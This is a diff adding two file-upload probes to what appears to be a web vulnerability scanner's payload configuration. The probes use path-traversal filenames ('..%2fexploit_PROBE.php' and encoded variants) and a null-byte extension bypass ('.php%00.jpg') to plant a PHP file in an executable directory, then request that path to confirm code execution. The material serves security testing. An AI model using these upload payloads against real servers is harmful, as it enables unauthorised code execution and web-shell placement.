@@ -822,6 +822,33 @@
           "variables": {}
         }
       ]
+    },
+    "filename_path_traversal": {
+      "description": "Web-shell upload via a traversal/null-byte FILENAME (not content) — the server URL-decodes but does not strip the path, writing the file to a parent (executable) directory instead of the sandboxed upload dir. Confirm by GETting the traversed path (executes) vs 404 at the canonical path.",
+      "tech_match": ["PHP", "Apache", "nginx", "IIS", "ASP.NET", "Java"],
+      "param_match": ["file", "upload", "attachment", "document", "image", "photo", "avatar", "filename"],
+      "probes": [
+        {
+          "payload": "Upload with multipart filename=\"..%2fexploit_PROBE.php\" and body <?php echo 'PROBE_OK'; ?> (also try ../exploit_PROBE.php and ..%252fexploit_PROBE.php) — server decodes the traversal and writes outside the upload dir.",
+          "description": "Filename path traversal — an accepted upload whose filename traverses to an executable dir. Then GET the traversed path; PROBE_OK in the body confirms code execution.",
+          "matchers": [
+            {"type": "status", "status": [200, 201]},
+            {"type": "word", "words": ["upload", "success", "stored", "saved", "PROBE_OK"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "Upload with multipart filename=\"exploit_PROBE.php%00.jpg\" (null-byte extension) and PHP body — the extension check sees .jpg, the filesystem writes .php.",
+          "description": "Null-byte filename extension bypass — %00 truncates the stored name to .php while the validator reads .jpg. Confirm by GETting the .php path.",
+          "matchers": [
+            {"type": "status", "status": [200, 201]},
+            {"type": "word", "words": ["upload", "success", "stored", "saved"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 40
+        }
+      ]
     }
   }
 }
